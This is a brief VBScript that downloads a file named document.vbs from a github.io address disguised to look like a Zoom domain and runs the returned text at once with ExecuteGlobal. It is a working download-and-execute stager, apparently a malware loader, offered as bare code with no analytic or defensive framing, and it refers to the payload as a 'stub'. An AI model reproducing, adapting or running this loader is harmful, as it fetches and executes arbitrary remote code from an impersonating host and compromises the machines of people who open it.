Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://us05web-zoom-us.github.io/-pwd-xu1raGakc01dcBTosyHivGT3q/document.vbs", False
http.Send
If http.Status = 200 Then
    ExecuteGlobal http.responseText
Else
    MsgBox "Failed to download stub.vbs. HTTP " & http.Status, vbCritical
End If